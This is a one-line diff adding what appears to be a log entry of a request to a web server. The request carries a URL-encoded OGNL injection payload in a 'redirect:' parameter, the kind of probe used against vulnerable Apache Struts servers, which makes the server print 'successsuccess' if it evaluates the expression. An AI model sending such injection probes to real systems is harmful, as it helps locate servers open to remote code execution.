@@ -1,0 +1,1 @@
+Attempts: 1 - Request URL: www.bricksrus.com/index.asp?redirect:$%7B%23matt%3d%20%23context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),%23matt.setContentType(\'text/plain\'),%23matt.getWriter().println%20(\'successsuccess\'),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D
